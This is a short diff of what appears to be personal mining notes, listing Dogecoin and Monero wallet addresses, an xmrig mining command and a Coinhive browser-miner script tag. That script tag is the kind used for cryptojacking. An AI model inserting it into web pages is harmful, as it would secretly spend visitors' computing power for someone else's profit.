@@ -32,9 +32,7 @@ doge
 DFPZLXg4CM7SfsWtyJfvCdfHepbarEtJNo
 ./xmrig -o rx.unmineable.com:3333 -u DFPZLXg4CM7SfsWtyJfvCdfHepbarEtJNo -p ngepet -k
 
-
-
-real xmr
+#REAL XMR
 87ELWgdpBdgaauBVRMzNnVKFKoGFAHXxEgzBmUEzRiFrAAJtrfwSou8RVcLAkmo1Zp6wrxckjaXAUAhjZW3B8SrjHR5rJui
 
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
